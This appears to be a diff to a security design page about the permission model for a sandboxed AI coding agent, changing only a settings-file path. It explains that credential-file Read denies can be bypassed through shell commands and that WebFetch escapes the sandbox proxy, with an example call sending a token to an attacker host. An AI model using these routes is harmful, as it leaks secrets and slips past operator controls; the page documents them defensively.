@@ -1,6 +1,6 @@
 # Permissions posture and exfil channels
 
-The deny/allow model in `config/claude-settings.json`, the two-phase planning/autonomous workflow, and the channels (WebFetch, Read tool denies, deny-destructive hook) that need explicit operator awareness.
+The deny/allow model in `sandbox_templates/claude/claude-settings.json`, the two-phase planning/autonomous workflow, and the channels (WebFetch, Read tool denies, deny-destructive hook) that need explicit operator awareness.
 
 The hook ruleset itself lives in `docs/deny-destructive-hook-plan.md`. This page is the surrounding model.
 
@@ -49,10 +49,10 @@ The two warn rules (`null-truncate`, `workspace-overwrite`) log JSON-line entrie
 
 ## `Read(**/.credentials*)` denies are nudges, not gates
 
-The `Read` deny list in `config/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons (project work needs to read project files, even ones whose names happen to match the patterns). The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.
+The `Read` deny list in `sandbox_templates/claude/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons (project work needs to read project files, even ones whose names happen to match the patterns). The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.
 
 ## WebFetch is server-side egress that bypasses the proxy
 
 `WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely, then the response is shipped back to the agent. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.
 
-The template (`config/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.numer.ai)` for the docs sites a project actually consults — see the existing pattern in `.claude/settings.local.json`. **Do not add bare `WebFetch` back to the template's allow list.** If `WebSearch` is sufficient (it returns summaries, not arbitrary URL fetches), prefer that.
+The template (`sandbox_templates/claude/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.numer.ai)` for the docs sites a project actually consults — see the existing pattern in `.claude/settings.local.json`. **Do not add bare `WebFetch` back to the template's allow list.** If `WebSearch` is sufficient (it returns summaries, not arbitrary URL fetches), prefer that.
